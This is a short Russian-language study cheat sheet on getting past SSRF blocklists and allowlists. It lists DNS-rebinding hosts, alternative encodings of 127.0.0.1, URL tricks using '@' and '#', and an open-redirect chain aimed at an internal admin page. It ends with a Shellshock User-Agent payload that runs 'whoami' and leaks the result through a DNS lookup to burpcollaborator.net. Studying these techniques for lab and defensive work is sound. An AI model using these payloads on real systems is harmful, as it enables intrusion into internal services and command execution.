[PayloadsAllTheThings/Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-ssrf)
## Защита чёрного списка

### DNS rebinding
- make-1.2.3.4-rebind-127.0-0.1-rr.1u.ms
- double.terjanq.me
- 7f000001.2223367c.rbndr.us
### Альтернативное представление IP-адреса
127.0.0.1:
1. 2130706433
2. 017700000001
3. 127.1
4. spoofed.burpcollaborator.net
### URL-кодировки и разные варианты регистра
### Замена https на http и наоборот

## Защита белого списка

### Вставка учётных данных в URL-адрес перед именем хоста, используя символ @:
1. https://ожидаемый-хост:какойтоПароль@зловредный-хост
### Использование символа # для обозначения якоря в URL:
1. https://зловредный-хост#ожидаемый-хост
### Использование иерархии DNS-имён, чтобы поместить необходимые входные данные в полное DNS-имя, которым можно управлять
1. https://ожидаемый-хост.зловредный-хост
### URL кодировки
### Всё вместе:
1. http://localhost:80#@stock.weliketoshop.net/admin
## Open redirect
`stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=1%26path=http://192.168.0.68/admin`

## Blind SSRF
### Shell Shock
User-Agent: `() {:;}; $(whoami).burpcollaborator.net`
Referer: `http://192.168.0.$1$`